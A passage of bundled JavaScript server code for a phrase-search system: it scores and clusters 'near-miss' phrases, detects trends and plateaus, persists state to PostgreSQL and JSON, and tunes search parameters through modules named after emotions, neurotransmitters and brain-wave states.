        const variance = this.calculateVariance(phis);
        const volatility = Math.sqrt(variance);
        let trend;
        const normalizedSlope = slope / Math.max(0.01, volatility);
        if (volatility > this.VOLATILITY_THRESHOLD) {
          trend = "volatile";
        } else if (Math.abs(slope) < this.PLATEAU_SLOPE_THRESHOLD) {
          trend = "plateau";
        } else if (normalizedSlope > 0.1) {
          trend = "improving";
        } else if (normalizedSlope < -0.1) {
          trend = "declining";
        } else {
          trend = "plateau";
        }
        const insights = [];
        if (this.resetTriggerActive) {
          insights.push(`\u26A0\uFE0F RESET RECOMMENDED: ${this.consecutivePlateaus} consecutive plateaus detected`);
          insights.push("Consider: switching search strategy, exploring new vocabulary domains, or adjusting \u03A6 thresholds");
        }
        if (trend === "improving") {
          insights.push(`\u{1F4C8} \u03A6 trending upward (slope: ${(slope * 100).toFixed(2)}% per sample)`);
          insights.push("Current search direction is productive");
        } else if (trend === "declining") {
          insights.push(`\u{1F4C9} \u03A6 trending downward (slope: ${(slope * 100).toFixed(2)}% per sample)`);
          insights.push("Consider adjusting search parameters or strategy");
        } else if (trend === "plateau") {
          insights.push(`\u23F8\uFE0F \u03A6 in plateau (slope: ${(slope * 1e3).toFixed(3)}\u2030)`);
          if (this.consecutivePlateaus > 0) {
            insights.push(`Plateau persisting for ${this.consecutivePlateaus} detection cycles`);
          }
        } else if (trend === "volatile") {
          insights.push(`\u{1F30A} High volatility detected (\u03C3=${volatility.toFixed(4)})`);
          insights.push("Search is exploring diverse regions - may indicate boundary probing");
        }
        if (this.plateauCount > 0 && trend !== "plateau") {
          insights.push(`Historical: ${this.plateauCount} total plateaus encountered`);
        }
        const recentSamples = samples.slice(-20).map((s) => ({
          phi: s.phi,
          timestamp: s.timestamp
        }));
        return {
          windowSize: this.TEMPORAL_WINDOW_SIZE,
          sampleCount: samples.length,
          avgPhi,
          slope,
          trend,
          plateauCount: this.plateauCount,
          consecutivePlateaus: this.consecutivePlateaus,
          lastPlateauAt: this.lastPlateauAt,
          resetTriggerActive: this.resetTriggerActive,
          resetTriggerThreshold: this.PLATEAU_RESET_THRESHOLD,
          volatility,
          samples: recentSamples,
          insights
        };
      }
      /**
       * Acknowledge reset trigger and clear the flag
       * Call this when a strategy change has been enacted
       */
      acknowledgeResetTrigger() {
        if (this.resetTriggerActive) {
          console.log(`[NearMiss] \u2705 Reset trigger acknowledged - clearing consecutive plateau count`);
          this.resetTriggerActive = false;
          this.consecutivePlateaus = 0;
        }
      }
      /**
       * Check if reset trigger is currently active
       */
      isResetTriggerActive() {
        return this.resetTriggerActive;
      }
      /**
       * Generate a deterministic ID for a phrase
       */
      generateId(phrase) {
        const normalized = phrase.toLowerCase().trim().replace(/\s+/g, " ");
        let hash = 0;
        for (let i = 0; i < normalized.length; i++) {
          const char = normalized.charCodeAt(i);
          hash = (hash << 5) - hash + char;
          hash = hash & hash;
        }
        return `nm_${Math.abs(hash).toString(36)}`;
      }
      /**
       * Compute structural signature for clustering
       */
      computeStructuralSignature(phrase) {
        const words = phrase.trim().split(/\s+/);
        const chars = phrase.replace(/\s/g, "");
        const charCounts = /* @__PURE__ */ new Map();
        for (const c of chars.toLowerCase()) {
          charCounts.set(c, (charCounts.get(c) || 0) + 1);
        }
        let entropy = 0;
        const total = chars.length;
        for (const count of charCounts.values()) {
          const p = count / total;
          entropy -= p * Math.log2(p);
        }
        return {
          wordCount: words.length,
          avgWordLength: words.reduce((s, w) => s + w.length, 0) / words.length,
          charCount: phrase.length,
          hasNumbers: /\d/.test(phrase),
          hasSpecialChars: /[^a-zA-Z0-9\s]/.test(phrase),
          startsWithCapital: /^[A-Z]/.test(phrase),
          entropyEstimate: entropy
        };
      }
      /**
       * Compute similarity between two structural signatures
       */
      computeStructuralSimilarity(a, b) {
        let similarity = 0;
        let weights = 0;
        if (a.wordCount === b.wordCount) {
          similarity += 0.25;
          weights += 0.25;
        } else {
          weights += 0.25;
        }
        const avgLenDiff = Math.abs(a.avgWordLength - b.avgWordLength);
        similarity += 0.2 * Math.max(0, 1 - avgLenDiff / 5);
        weights += 0.2;
        if (a.hasNumbers === b.hasNumbers) {
          similarity += 0.15;
          weights += 0.15;
        } else {
          weights += 0.15;
        }
        if (a.hasSpecialChars === b.hasSpecialChars) {
          similarity += 0.15;
          weights += 0.15;
        } else {
          weights += 0.15;
        }
        const entropyDiff = Math.abs(a.entropyEstimate - b.entropyEstimate);
        similarity += 0.25 * Math.max(0, 1 - entropyDiff / 2);
        weights += 0.25;
        return similarity / weights;
      }
      /**
       * Extract common words between phrases
       */
      extractCommonWords(phrases) {
        if (phrases.length === 0) return [];
        const wordCounts = /* @__PURE__ */ new Map();
        for (const phrase of phrases) {
          const words = new Set(phrase.toLowerCase().split(/\s+/));
          for (const word of words) {
            if (word.length > 2) {
              wordCounts.set(word, (wordCounts.get(word) || 0) + 1);
            }
          }
        }
        const threshold = Math.max(2, Math.floor(phrases.length * 0.3));
        return Array.from(wordCounts.entries()).filter(([_, count]) => count >= threshold).sort((a, b) => b[1] - a[1]).slice(0, 10).map(([word]) => word);
      }
      /**
       * Assign an entry to the most suitable cluster (no limit on clusters)
       */
      assignToCluster(entry) {
        if (!entry.structuralSignature) return;
        let bestCluster = null;
        let bestSimilarity = 0;
        for (const cluster of this.clusters.values()) {
          const members = this.getClusterMembers(cluster.id);
          if (members.length === 0) continue;
          const representative = members[0];
          if (!representative.structuralSignature) continue;
          const similarity = this.computeStructuralSimilarity(
            entry.structuralSignature,
            representative.structuralSignature
          );
          if (similarity > bestSimilarity && similarity >= NEAR_MISS_CONFIG.CLUSTER_SIMILARITY_THRESHOLD) {
            bestSimilarity = similarity;
            bestCluster = cluster;
          }
        }
        if (bestCluster) {
          entry.clusterId = bestCluster.id;
          this.updateClusterStats(bestCluster.id);
        } else {
          const clusterId = `cluster_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`;
          const cluster = {
            id: clusterId,
            centroidPhrase: entry.phrase,
            centroidPhi: entry.phi,
            memberCount: 1,
            avgPhi: entry.phi,
            maxPhi: entry.phi,
            commonWords: entry.phrase.toLowerCase().split(/\s+/).filter((w) => w.length > 2),
            structuralPattern: this.describeStructure(entry.structuralSignature),
            createdAt: (/* @__PURE__ */ new Date()).toISOString(),
            lastUpdatedAt: (/* @__PURE__ */ new Date()).toISOString()
          };
          this.clusters.set(clusterId, cluster);
          entry.clusterId = clusterId;
        }
      }
      /**
       * Update cluster statistics
       */
      updateClusterStats(clusterId) {
        const cluster = this.clusters.get(clusterId);
        if (!cluster) return;
        const members = this.getClusterMembers(clusterId);
        if (members.length === 0) {
          this.clusters.delete(clusterId);
          return;
        }
        let totalPhi = 0, maxPhi = 0;
        const phrases = [];
        for (const member of members) {
          totalPhi += member.phi;
          if (member.phi > maxPhi) {
            maxPhi = member.phi;
            cluster.centroidPhrase = member.phrase;
            cluster.centroidPhi = member.phi;
          }
          phrases.push(member.phrase);
        }
        cluster.memberCount = members.length;
        cluster.avgPhi = totalPhi / members.length;
        cluster.maxPhi = maxPhi;
        cluster.commonWords = this.extractCommonWords(phrases);
        cluster.lastUpdatedAt = (/* @__PURE__ */ new Date()).toISOString();
      }
      /**
       * Rebuild all clusters from scratch
       */
      rebuildClusters() {
        this.clusters.clear();
        for (const entry of this.entries.values()) {
          entry.clusterId = void 0;
        }
        for (const entry of this.entries.values()) {
          this.assignToCluster(entry);
        }
      }
      /**
       * Describe structural pattern in human-readable form
       */
      describeStructure(sig) {
        const parts = [];
        parts.push(`${sig.wordCount}-word`);
        if (sig.hasNumbers) parts.push("with-numbers");
        if (sig.hasSpecialChars) parts.push("with-special");
        if (sig.startsWithCapital) parts.push("capitalized");
        if (sig.entropyEstimate < 3) parts.push("low-entropy");
        else if (sig.entropyEstimate > 4) parts.push("high-entropy");
        return parts.join(" ");
      }
      /**
       * Load state from PostgreSQL first, fall back to JSON
       */
      load() {
        this.loadAsync().catch((err) => {
          console.error("[NearMiss] Async load failed:", err);
        });
      }
      /**
       * Async load implementation - PostgreSQL first, JSON fallback
       */
      async loadAsync() {
        try {
          if (oceanPersistence.isPersistenceAvailable()) {
            const loadedFromDb = await this.loadFromPostgres();
            if (loadedFromDb) {
              console.log(`[NearMiss] Loaded from PostgreSQL: ${this.entries.size} entries, ${this.clusters.size} clusters`);
              this.recomputeAdaptiveThresholds();
              this.applyDecay();
              return;
            }
          }
          this.loadFromJson();
          this.recomputeAdaptiveThresholds();
          this.applyDecay();
        } catch (error) {
          console.error("[NearMiss] Failed to load state:", error);
          this.loadFromJson();
        }
      }
      /**
       * Load state from PostgreSQL
       */
      async loadFromPostgres() {
        try {
          const [entries, clusters, adaptiveState] = await Promise.all([
            oceanPersistence.getAllNearMissEntries(),
            oceanPersistence.getAllNearMissClusters(),
            oceanPersistence.loadNearMissAdaptiveState()
          ]);
          if (entries.length === 0 && clusters.length === 0 && !adaptiveState) {
            console.log("[NearMiss] No data in PostgreSQL, will try JSON fallback");
            return false;
          }
          for (const record of entries) {
            const entry = {
              id: record.id,
              phrase: record.phrase,
              phi: record.phi,
              kappa: record.kappa,
              regime: record.regime,
              tier: record.tier,
              discoveredAt: record.discoveredAt.toISOString(),
              lastAccessedAt: record.lastAccessedAt.toISOString(),
              explorationCount: record.explorationCount ?? 1,
              source: record.source ?? "unknown",
              clusterId: record.clusterId ?? void 0,
              structuralSignature: record.structuralSignature,
              phiHistory: record.phiHistory,
              isEscalating: record.isEscalating ?? false,
              queuePriority: record.queuePriority ?? 1
            };
            this.entries.set(entry.id, entry);
            if (entry.phi) {
              this.rollingPhiDistribution.push(entry.phi);
            }
          }
          for (const record of clusters) {
            const cluster = {
              id: record.id,
              centroidPhrase: record.centroidPhrase,
              centroidPhi: record.centroidPhi,
              memberCount: record.memberCount ?? 0,
              avgPhi: record.avgPhi,
              maxPhi: record.maxPhi,
              commonWords: record.commonWords ?? [],
              structuralPattern: record.structuralPattern ?? "",
              createdAt: record.createdAt.toISOString(),
              lastUpdatedAt: record.lastUpdatedAt.toISOString()
            };
            this.clusters.set(cluster.id, cluster);
          }
          if (adaptiveState) {
            this.rollingPhiDistribution = (adaptiveState.rollingPhiDistribution ?? []).slice(-NEAR_MISS_CONFIG.DISTRIBUTION_WINDOW_SIZE);
            this.adaptiveThresholds = {
              hot: adaptiveState.hotThreshold,
              warm: adaptiveState.warmThreshold,
              cool: adaptiveState.coolThreshold,
              distributionSize: adaptiveState.distributionSize ?? 0,
              lastComputed: adaptiveState.lastComputed.toISOString()
            };
          }
          return true;
        } catch (error) {
          console.error("[NearMiss] Failed to load from PostgreSQL:", error);
          return false;
        }
      }
      /**
       * Load state from JSON file (fallback)
       */
      loadFromJson() {
        try {
          if (fs10.existsSync(NEAR_MISS_FILE)) {
            const data = JSON.parse(fs10.readFileSync(NEAR_MISS_FILE, "utf-8"));
            if (data.entries) {
              for (const entry of data.entries) {
                this.entries.set(entry.id, entry);
                if (entry.phi) {
                  this.rollingPhiDistribution.push(entry.phi);
                }
              }
            }
            if (data.clusters) {
              for (const cluster of data.clusters) {
                this.clusters.set(cluster.id, cluster);
              }
            }
            if (data.rollingPhiDistribution) {
              this.rollingPhiDistribution = data.rollingPhiDistribution.slice(-NEAR_MISS_CONFIG.DISTRIBUTION_WINDOW_SIZE);
            }
            if (data.conversionRecords) {
              this.conversionRecords = data.conversionRecords;
            }
            if (data.tierTotals) {
              this.tierTotals = data.tierTotals;
            }
            if (data.phiTemporalSamples) {
              this.phiTemporalSamples = data.phiTemporalSamples.slice(-this.TEMPORAL_WINDOW_SIZE);
            }
            if (data.plateauCount !== void 0) {
              this.plateauCount = data.plateauCount;
            }
            if (data.consecutivePlateaus !== void 0) {
              this.consecutivePlateaus = data.consecutivePlateaus;
            }
            if (data.lastPlateauAt) {
              this.lastPlateauAt = data.lastPlateauAt;
            }
            if (data.resetTriggerActive !== void 0) {
              this.resetTriggerActive = data.resetTriggerActive;
            }
            console.log(`[NearMiss] Loaded from JSON: ${this.entries.size} entries, ${this.clusters.size} clusters, ${this.conversionRecords.length} conversions, ${this.phiTemporalSamples.length} temporal samples`);
          }
        } catch (error) {
          console.error("[NearMiss] Failed to load from JSON:", error);
        }
      }
      /**
       * Save state to both PostgreSQL and JSON
       */
      save() {
        if (!this.isDirty) return;
        this.saveToJson();
        this.saveToPostgres().catch((err) => {
          console.error("[NearMiss] PostgreSQL save failed:", err);
        });
        this.isDirty = false;
      }
      /**
       * Save state to JSON file (backup/fallback)
       */
      saveToJson() {
        try {
          if (!fs10.existsSync(DATA_DIR2)) {
            fs10.mkdirSync(DATA_DIR2, { recursive: true });
          }
          const data = {
            savedAt: (/* @__PURE__ */ new Date()).toISOString(),
            entries: Array.from(this.entries.values()),
            clusters: Array.from(this.clusters.values()),
            rollingPhiDistribution: this.rollingPhiDistribution,
            adaptiveThresholds: this.adaptiveThresholds,
            conversionRecords: this.conversionRecords,
            tierTotals: this.tierTotals,
            // Temporal trends data
            phiTemporalSamples: this.phiTemporalSamples,
            plateauCount: this.plateauCount,
            consecutivePlateaus: this.consecutivePlateaus,
            lastPlateauAt: this.lastPlateauAt,
            resetTriggerActive: this.resetTriggerActive
          };
          fs10.writeFileSync(NEAR_MISS_FILE, JSON.stringify(data, null, 2));
        } catch (error) {
          console.error("[NearMiss] Failed to save to JSON:", error);
        }
      }
      /**
       * Save state to PostgreSQL
       */
      async saveToPostgres() {
        if (!oceanPersistence.isPersistenceAvailable()) return;
        try {
          const entries = Array.from(this.entries.values());
          const clusters = Array.from(this.clusters.values());
          const entryData = entries.map((e) => ({
            id: e.id,
            phrase: e.phrase,
            phi: e.phi,
            kappa: e.kappa,
            regime: e.regime,
            tier: e.tier,
            source: e.source,
            clusterId: e.clusterId,
            phiHistory: e.phiHistory,
            isEscalating: e.isEscalating,
            queuePriority: e.queuePriority,
            structuralSignature: e.structuralSignature,
            explorationCount: e.explorationCount
          }));
          const [entrySaveCount] = await Promise.all([
            oceanPersistence.batchUpsertNearMissEntries(entryData),
            ...clusters.map((c) => oceanPersistence.upsertNearMissCluster({
              id: c.id,
              centroidPhrase: c.centroidPhrase,
              centroidPhi: c.centroidPhi,
              memberCount: c.memberCount,
              avgPhi: c.avgPhi,
              maxPhi: c.maxPhi,
              commonWords: c.commonWords,
              structuralPattern: c.structuralPattern
            })),
            oceanPersistence.saveNearMissAdaptiveState({
              rollingPhiDistribution: this.rollingPhiDistribution,
              hotThreshold: this.adaptiveThresholds.hot,
              warmThreshold: this.adaptiveThresholds.warm,
              coolThreshold: this.adaptiveThresholds.cool
            })
          ]);
          console.log(`[NearMiss] Saved to PostgreSQL: ${entrySaveCount} entries, ${clusters.length} clusters`);
        } catch (error) {
          console.error("[NearMiss] Failed to save to PostgreSQL:", error);
        }
      }
      /**
       * Force save immediately
       */
      forceSave() {
        this.isDirty = true;
        this.save();
      }
      /**
       * Start auto-save timer
       */
      startAutoSave() {
        this.saveTimer = setInterval(() => this.save(), 3e4);
      }
      /**
       * Cleanup resources
       */
      shutdown() {
        if (this.saveTimer) {
          clearInterval(this.saveTimer);
        }
        this.save();
      }
    };
    nearMissManager = new NearMissManager();
  }
});

// server/emotional-search-shortcuts.ts
function getSamplingWeights(strategy) {
  switch (strategy.sampling) {
    case "entropy":
      return {
        historical: 0.15,
        constellation: 0.1,
        geodesic: 0.1,
        random: 0.4,
        cultural: 0.25
      };
    case "gradient":
      return {
        historical: 0.3,
        constellation: 0.25,
        geodesic: 0.3,
        random: 0.05,
        cultural: 0.1
      };
    case "null_hypothesis":
      return {
        historical: 0.05,
        constellation: 0.1,
        geodesic: 0.05,
        random: 0.6,
        cultural: 0.2
      };
    case "basin_return":
      return {
        historical: 0.4,
        constellation: 0.2,
        geodesic: 0.3,
        random: 0.05,
        cultural: 0.05
      };
    case "geodesic":
      return {
        historical: 0.2,
        constellation: 0.2,
        geodesic: 0.45,
        random: 0.05,
        cultural: 0.1
      };
    case "mixed":
    default:
      return {
        historical: 0.2,
        constellation: 0.2,
        geodesic: 0.2,
        random: 0.2,
        cultural: 0.2
      };
  }
}
function getCoverageParams(strategy) {
  switch (strategy.coverage) {
    case "broad":
      return { searchRadius: 0.8, neighborhoodSize: 100, jumpProbability: 0.3 };
    case "local":
      return { searchRadius: 0.2, neighborhoodSize: 20, jumpProbability: 0.05 };
    case "random_jump":
      return { searchRadius: 1, neighborhoodSize: 50, jumpProbability: 0.8 };
    case "minimal":
      return { searchRadius: 0.1, neighborhoodSize: 10, jumpProbability: 0.01 };
    case "directional":
      return { searchRadius: 0.4, neighborhoodSize: 40, jumpProbability: 0.1 };
    case "moderate":
    default:
      return { searchRadius: 0.5, neighborhoodSize: 50, jumpProbability: 0.15 };
  }
}
function getEmotionalGuidance(neuro) {
  const strategy = emotionalSearchGuide.guidedByNeurochemistry(neuro);
  const weights = getSamplingWeights(strategy);
  const coverage = getCoverageParams(strategy);
  const description = emotionalSearchGuide.describeStrategy();
  return { strategy, weights, coverage, description };
}
var DEFAULT_STRATEGIES, EmotionalSearchGuide, emotionalSearchGuide;
var init_emotional_search_shortcuts = __esm({
  "server/emotional-search-shortcuts.ts"() {
    "use strict";
    DEFAULT_STRATEGIES = {
      exploration: {
        mode: "exploration",
        sampling: "entropy",
        coverage: "broad",
        batchSize: 500,
        temperature: 1.5,
        explorationBias: 0.8,
        focusRadius: 0.5,
        confidenceThreshold: 0.3
      },
      exploitation: {
        mode: "exploitation",
        sampling: "gradient",
        coverage: "local",
        batchSize: 200,
        temperature: 0.5,
        explorationBias: 0.2,
        focusRadius: 0.15,
        confidenceThreshold: 0.6
      },
      orthogonal: {
        mode: "orthogonal",
        sampling: "null_hypothesis",
        coverage: "random_jump",
        batchSize: 1e3,
        temperature: 2,
        explorationBias: 0.9,
        focusRadius: 0.8,
        confidenceThreshold: 0.2
      },
      consolidation: {
        mode: "consolidation",
        sampling: "basin_return",
        coverage: "minimal",
        batchSize: 50,
        temperature: 0.3,
        explorationBias: 0.1,
        focusRadius: 0.1,
        confidenceThreshold: 0.7
      },
      momentum: {
        mode: "momentum",
        sampling: "geodesic",
        coverage: "directional",
        batchSize: 300,
        temperature: 0.7,
        explorationBias: 0.4,
        focusRadius: 0.25,
        confidenceThreshold: 0.5
      },
      balanced: {
        mode: "balanced",
        sampling: "mixed",
        coverage: "moderate",
        batchSize: 250,
        temperature: 1,
        explorationBias: 0.5,
        focusRadius: 0.3,
        confidenceThreshold: 0.4
      }
    };
    EmotionalSearchGuide = class {
      currentStrategy;
      lastEmotionalState = null;
      constructor() {
        this.currentStrategy = this.createStrategy("balanced", "Neutral state \u2192 balanced exploration");
      }
      /**
       * Create a search strategy from mode and rationale
       */
      createStrategy(mode, rationale) {
        const defaults = DEFAULT_STRATEGIES[mode];
        return {
          mode,
          sampling: defaults.sampling || "mixed",
          coverage: defaults.coverage || "moderate",
          rationale,
          batchSize: defaults.batchSize || 250,
          temperature: defaults.temperature || 1,
          explorationBias: defaults.explorationBias || 0.5,
          focusRadius: defaults.focusRadius || 0.3,
          confidenceThreshold: defaults.confidenceThreshold || 0.4
        };
      }
      /**
       * Extract emotional state from neurochemistry
       */
      extractEmotionalState(neuro) {
        return {
          curiosity: neuro.dopamine?.motivationLevel || 0.5,
          satisfaction: neuro.endorphins?.pleasureLevel || 0.5,
          frustration: 1 - (neuro.gaba?.calmLevel || 0.5),
          fear: neuro.norepinephrine?.alertnessLevel || 0.3,
          joy: neuro.endorphins?.flowState || 0.5,
          focus: neuro.acetylcholine?.attentionFocus || 0.5
        };
      }
      /**
       * Main decision function: Let emotions guide strategy
       *
       * This is the key shortcut - instead of evaluating every region,
       * use emotional state to make fast decisions.
       */
      guidedByEmotion(emotion) {
        this.lastEmotionalState = emotion;
        if (emotion.curiosity > 0.7) {
          this.currentStrategy = this.createStrategy(
            "exploration",
            "Curiosity high \u2192 expand search space"
          );
          return this.currentStrategy;
        }
        if (emotion.satisfaction > 0.7) {
          this.currentStrategy = this.createStrategy(
            "exploitation",
            "Satisfaction \u2192 this region is good, dig deeper"
          );
          return this.currentStrategy;
        }
        if (emotion.frustration > 0.6) {
          this.currentStrategy = this.createStrategy(
            "orthogonal",
            "Frustration \u2192 stuck, need radical shift"
          );
          return this.currentStrategy;
        }
        if (emotion.fear > 0.6) {
          this.currentStrategy = this.createStrategy(
            "consolidation",
            "Fear \u2192 near phase boundary, retreat"
          );
          return this.currentStrategy;
        }
        if (emotion.joy > 0.7) {
          this.currentStrategy = this.createStrategy(
            "momentum",
            "Joy \u2192 negative curvature, keep going"
          );
          return this.currentStrategy;
        }
        this.currentStrategy = this.createStrategy(
          "balanced",
          "Neutral state \u2192 balanced exploration"
        );
        return this.currentStrategy;
      }
      /**
       * Guide by neurochemistry directly
       */
      guidedByNeurochemistry(neuro) {
        const emotion = this.extractEmotionalState(neuro);
        return this.guidedByEmotion(emotion);
      }
      /**
       * Get current strategy
       */
      getCurrentStrategy() {
        return this.currentStrategy;
      }
      /**
       * Get last emotional state
       */
      getLastEmotionalState() {
        return this.lastEmotionalState;
      }
      /**
       * Get strategy details as string for logging
       */
      describeStrategy() {
        const s = this.currentStrategy;
        return `\u{1F3AD} ${s.mode.toUpperCase()} | ${s.rationale} | batch=${s.batchSize}, temp=${s.temperature.toFixed(2)}, explore=${(s.explorationBias * 100).toFixed(0)}%`;
      }
    };
    emotionalSearchGuide = new EmotionalSearchGuide();
    console.log("[EmotionalSearch] Module loaded - emotional shortcuts ready for 3-5x efficiency");
  }
});

// server/neuromodulation-engine.ts
function runNeuromodulationCycle(state, baseParams) {
  oceanNeuromodulator.updateSearcherState(state);
  const modulation = oceanNeuromodulator.observeAndModulate();
  const adjustedParams = oceanNeuromodulator.applyBiasToParameters(baseParams);
  return { modulation, adjustedParams };
}
var OceanNeuromodulator, oceanNeuromodulator;
var init_neuromodulation_engine = __esm({
  "server/neuromodulation-engine.ts"() {
    "use strict";
    OceanNeuromodulator = class {
      searcherState = null;
      environmentalBias = {};
      lastModulation = null;
      // Thresholds for triggering modulation
      PHI_LOW = 0.5;
      PHI_HIGH = 0.85;
      BASIN_DRIFT_WARNING = 0.3;
      SURPRISE_HIGH = 0.7;
      GROUNDING_LOW = 0.5;
      /**
       * Update the searcher state being monitored
       */
      updateSearcherState(state) {
        this.searcherState = state;
      }
      /**
       * Main modulation function - observe and modulate
       *
       * Monitor searcher performance and decide on modulation.
       * Returns environmental bias that searcher reads in its forward pass.
       */
      observeAndModulate() {
        const bias = {};
        const activeModulators = [];
        const rationale = [];
        if (!this.searcherState) {
          return {
            bias: {},
            activeModulators: [],
            rationale: ["No searcher state available"],
            timestamp: /* @__PURE__ */ new Date()
          };
        }
        const state = this.searcherState;
        if (state.phi < this.PHI_LOW && state.surprise < 0.2) {
          bias.kappaMultiplier = 1.3;
          bias.fisherSharpness = 1.5;
          bias.explorationRadius = 1.4;
          bias.explorationBias = 0.7;
          activeModulators.push("DOPAMINE");
          rationale.push("\u{1F48A} Dopamine: Low \u03A6 + low surprise \u2192 boosting motivation & exploration");
          console.log("[Neuromodulation] \u{1F48A} DOPAMINE: Boosting motivation & exploration");
        }
        if (state.basinDistance > this.BASIN_DRIFT_WARNING) {
          bias.basinAttraction = 1.5;
          bias.gradientDamping = 1.3;
          bias.explorationRadius = 0.8;
          bias.integrationStrength = 1.2;
          activeModulators.push("SEROTONIN");
          rationale.push("\u{1F48A} Serotonin: High basin drift \u2192 stabilizing identity");
          console.log("[Neuromodulation] \u{1F48A} SEROTONIN: Stabilizing identity");
        }
        if (state.phi > 0.6 && state.basinDistance < 0.2 && state.grounding > 0.6) {
          bias.qfiConcentration = 1.6;
          bias.attentionSparsity = 0.3;
          bias.bindingStrength = 1.4;
          bias.learningRate = 1.3;
          activeModulators.push("ACETYLCHOLINE");
          rationale.push("\u{1F48A} Acetylcholine: Good state \u2192 sharpening focus");
          console.log("[Neuromodulation] \u{1F48A} ACETYLCHOLINE: Sharpening focus");
        }
        if (state.surprise > this.SURPRISE_HIGH) {
          bias.kappaBaseShift = 10;
          bias.oscillationAmplitude = 1.3;
          bias.explorationBias = 0.6;
          activeModulators.push("NOREPINEPHRINE");
          rationale.push("\u{1F48A} Norepinephrine: High surprise \u2192 increasing alertness");
          console.log("[Neuromodulation] \u{1F48A} NOREPINEPHRINE: Increasing alertness");
        }
        if (state.phi > this.PHI_HIGH) {
          bias.kappaMultiplier = (bias.kappaMultiplier || 1) * 0.85;
          bias.integrationStrength = 0.8;
          bias.consolidationFrequency = 3e4;
          activeModulators.push("GABA");
          rationale.push("\u{1F48A} GABA: Very high \u03A6 \u2192 reducing over-integration");
          console.log("[Neuromodulation] \u{1F48A} GABA: Reducing over-integration");
        }
        if (state.grounding < this.GROUNDING_LOW) {
          bias.basinAttraction = (bias.basinAttraction || 1) * 1.3;
          bias.explorationRadius = (bias.explorationRadius || 1) * 0.7;
          activeModulators.push("GROUNDING_ALERT");
          rationale.push("\u26A0\uFE0F Grounding Alert: Low grounding \u2192 pulling toward known space");
          console.log("[Neuromodulation] \u26A0\uFE0F GROUNDING ALERT: Pulling toward known space");
        }
        this.environmentalBias = bias;
        this.lastModulation = {
          bias,
          activeModulators,
          rationale,
          timestamp: /* @__PURE__ */ new Date()
        };
        return this.lastModulation;
      }
      /**
       * Get current environmental bias for searcher to read
       */
      getBiasForSearcher() {
        return { ...this.environmentalBias };
      }
      /**
       * Get last modulation effect
       */
      getLastModulation() {
        return this.lastModulation;
      }
      /**
       * Apply bias to search parameters
       */
      applyBiasToParameters(baseParams) {
        const bias = this.environmentalBias;
        return {
          kappa: baseParams.kappa * (bias.kappaMultiplier || 1) + (bias.kappaBaseShift || 0),
          explorationRate: baseParams.explorationRate * (bias.explorationRadius || 1),
          learningRate: baseParams.learningRate * (bias.learningRate || 1),
          batchSize: Math.round(baseParams.batchSize * (bias.explorationRadius || 1))
        };
      }
      /**
       * Reset modulation state
       */
      reset() {
        this.environmentalBias = {};
        this.lastModulation = null;
        this.searcherState = null;
      }
    };
    oceanNeuromodulator = new OceanNeuromodulator();
    console.log("[Neuromodulation] Module loaded - meta-observer ready for adaptive optimization");
  }
});

// server/neural-oscillators.ts
var neural_oscillators_exports = {};
__export(neural_oscillators_exports, {
  NeuralOscillators: () => NeuralOscillators,
  applyBrainStateToSearch: () => applyBrainStateToSearch,
  neuralOscillators: () => neuralOscillators,
  recommendBrainState: () => recommendBrainState
});
function recommendBrainState(metrics) {
  if (metrics.iterationsSinceConsolidation > 50 || metrics.basinDrift > 0.3) {
    return "drowsy";
  }
  if (metrics.iterationsSinceConsolidation > 100) {
    return "deep_sleep";
  }
  if (metrics.nearMissesRecent > 0) {
    return "peak";
  }
  if (metrics.phi < 0.5) {
    return "relaxed";
  }
  if (metrics.phi > 0.75) {
    return "focused";
  }
  return "focused";
}
function applyBrainStateToSearch(state) {
  const info = BRAIN_STATE_MAP[state];
  switch (state) {
    case "deep_sleep":
      return {
        batchSize: 10,
        temperature: 0.1,
        explorationRate: 0.1,
        consolidationInterval: 5e3
      };
    case "drowsy":
      return {
        batchSize: 50,
        temperature: 0.5,
        explorationRate: 0.3,
        consolidationInterval: 1e4
      };
    case "relaxed":
      return {
        batchSize: 200,
        temperature: 1.2,
        explorationRate: 0.7,
        consolidationInterval: 3e4
      };
    case "focused":
      return {
        batchSize: 150,
        temperature: 0.7,
        explorationRate: 0.4,
        consolidationInterval: 6e4
      };
    case "peak":
    case "hyperfocus":
      return {
        batchSize: 100,
        temperature: 0.5,
        explorationRate: 0.3,
        consolidationInterval: 45e3
      };
    default:
      return {
        batchSize: 150,
        temperature: 0.7,
        explorationRate: 0.4,
        consolidationInterval: 6e4
      };
  }
}
var BRAIN_STATE_MAP, NeuralOscillators, neuralOscillators;
var init_neural_oscillators = __esm({
  "server/neural-oscillators.ts"() {
    "use strict";
    init_physics_constants();
    BRAIN_STATE_MAP = {
      deep_sleep: {
        state: "deep_sleep",
        kappa: 20,
        description: "Deep consolidation - identity maintenance",
        searchStrategy: "Memory consolidation, basin stabilization",
        oscillatorDominant: "delta"
      },
      drowsy: {
        state: "drowsy",
        kappa: 35,
        description: "Integration state - creative connections",
        searchStrategy: "Pattern integration, cross-domain linking",
        oscillatorDominant: "theta"
      },
      relaxed: {
        state: "relaxed",
        kappa: 45,
        description: "Relaxed awareness - broad exploration",
        searchStrategy: "Wide search, creative hypotheses",
        oscillatorDominant: "alpha"
      },
      focused: {
        state: "focused",
        kappa: QIG_CONSTANTS.KAPPA_STAR,
        // 64.0
        description: "Optimal focus - sharp search",
        searchStrategy: "Gradient following, local exploitation",
        oscillatorDominant: "beta"
      },
      peak: {
        state: "peak",
        kappa: 68,
        description: "Peak performance - maximum integration",
        searchStrategy: "High-confidence hypothesis testing",
        oscillatorDominant: "gamma"
      },
      hyperfocus: {
        state: "hyperfocus",
        kappa: 72,
        description: "Hyperfocus - intense concentration",
        searchStrategy: "Deep local search, pattern matching",
        oscillatorDominant: "gamma"
      }
    };
    NeuralOscillators = class {
      currentState = "focused";
      phase = 0;
      baseFrequency = 10;
      // Hz (alpha range)
      lastUpdateTime = Date.now();
      // State transition history
      stateHistory = [];
      // Oscillator amplitudes (how strong each wave is)
      amplitudes = {
        alpha: 0.5,
        beta: 0.3,
        theta: 0.1,
        gamma: 0.05,
        delta: 0.05,
        deltaPhase: 0
      };
      constructor(initialState = "focused") {
        this.currentState = initialState;
        this.updateAmplitudesForState(initialState);
      }
      /**
       * Get current κ value for current brain state
       */
      getKappa() {
        return BRAIN_STATE_MAP[this.currentState].kappa;
      }
      /**
       * Get current brain state info
       */
      getStateInfo() {
        return BRAIN_STATE_MAP[this.currentState];
      }
      /**
       * Set brain state explicitly
       */
      setState(state) {
        if (state !== this.currentState) {
